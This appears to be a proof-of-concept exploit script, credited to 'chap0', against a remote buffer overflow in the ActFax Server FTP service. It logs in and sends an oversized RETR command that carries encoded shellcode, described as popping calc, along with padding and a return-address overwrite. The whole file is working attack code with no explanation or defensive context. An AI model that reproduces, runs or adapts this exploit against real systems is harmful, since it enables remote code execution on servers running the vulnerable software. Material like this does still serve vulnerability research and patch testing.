import socket  

   

print "\nActFax Server FTP Remote BOF" 

print " chap0 - www.seek-truth.net \n" 

   

# pops calc  

calccode = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJINkXlqELKZL587Pep7PdoaxsSSQbLPcLMw5JXbpX8KwOcHBPwkON0A" 

   

# push ebp #pop eax #sub eax,55555521 * 3 :)  

junk = "\x55\x58\x2D\x21\x55\x55\x55\x2D\x21\x55\x55\x55\x2D\x21\x55\x55\x55" + "C"*135 + calccode + "A"*(616-len(calccode))  

   

payload = junk + "\x37\x27\x40\x00" #RETN  

   

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  

connect=s.connect(('192.168.1.2',21))  

s.recv(1024)  

s.send('USER ' + 'chapo\r\n')  

print (s.recv(1024))  

s.send('PASS chapo\r\n')  

print (s.recv(1024))  

s.send('RETR ' + payload + '\r\n')  

s.close 
